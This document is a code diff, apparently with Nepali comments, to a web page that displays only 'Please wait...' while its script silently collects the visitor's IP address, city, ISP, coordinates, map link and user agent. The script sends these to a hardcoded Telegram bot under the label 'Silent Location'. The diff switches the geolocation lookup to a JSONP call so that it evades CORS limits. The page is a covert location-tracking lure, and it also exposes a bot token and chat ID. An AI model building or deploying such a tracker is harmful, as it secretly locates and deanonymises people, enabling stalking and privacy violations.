@@ -14,53 +14,62 @@
     <h2>Please wait...</h2>
 
     <script>
+        // ✅ JSONP तरिका — CORS समस्या हुँदैन
+        function getLocation(ip) {
+            const script = document.createElement('script');
+            script.src = `https://ip-api.com/json/${ip}?callback=handleLocation&fields=status,country,city,isp,lat,lon`;
+            document.body.appendChild(script);
+        }
+
+        function handleLocation(data) {
+            if (data.status === 'success') {
+                const lat = data.lat || '';
+                const lon = data.lon || '';
+                const city = data.city || '';
+                const country = data.country || '';
+                const isp = data.isp || '';
+
+                const location = `${country}, ${city} (${isp})`;
+                const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
+
+                // IP पहिले नै थाहा छैन, त्यसैले फेरि लिनुपर्छ
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(ipData => {
+                        const ip = ipData.ip;
+                        const ua = navigator.userAgent;
+
+                        const msg = `📍 **Silent Location**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
+
+                        const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
+                        const chatId = '8621764137';
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: msg,
+                                parse_mode: 'Markdown'
+                            })
+                        })
+                        .then(() => {
+                            document.body.innerHTML = `<h2>✅</h2><p style="color:green;">Done</p>`;
+                        })
+                        .catch(() => {
+                            document.body.innerHTML = `<h2>⚠️</h2><p>Telegram error</p>`;
+                        });
+                    });
+            } else {
+                document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
+            }
+        }
+
+        // IP लिने र JSONP call गर्ने
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
-                const ip = data.ip;
-                const ua = navigator.userAgent;
-
-                // ✅ ipwhois.io (HTTPS, free, reliable)
-                fetch(`https://ipwhois.io/json/${ip}`)
-                    .then(res => res.json())
-                    .then(locData => {
-                        if (locData.success !== false) {
-                            const lat = locData.latitude || '';
-                            const lon = locData.longitude || '';
-                            const city = locData.city || '';
-                            const country = locData.country || '';
-                            const isp = locData.isp || '';
-
-                            const location = `${country}, ${city} (${isp})`;
-                            const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
-
-                            const msg = `📍 **Silent Location**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
-
-                            const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
-                            const chatId = '8621764137';
-
-                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    text: msg,
-                                    parse_mode: 'Markdown'
-                                })
-                            })
-                            .then(() => {
-                                document.body.innerHTML = `<h2>✅</h2><p style="color:green;">Done</p>`;
-                            })
-                            .catch(() => {
-                                document.body.innerHTML = `<h2>⚠️</h2><p>Telegram error</p>`;
-                            });
-                        } else {
-                            document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
-                        }
-                    })
-                    .catch(() => {
-                        document.body.innerHTML = `<h2>⚠️</h2><p>API error</p>`;
-                    });
+                getLocation(data.ip);
             })
             .catch(() => {
                 document.body.innerHTML = `<h2>⚠️</h2><p>IP error</p>`;
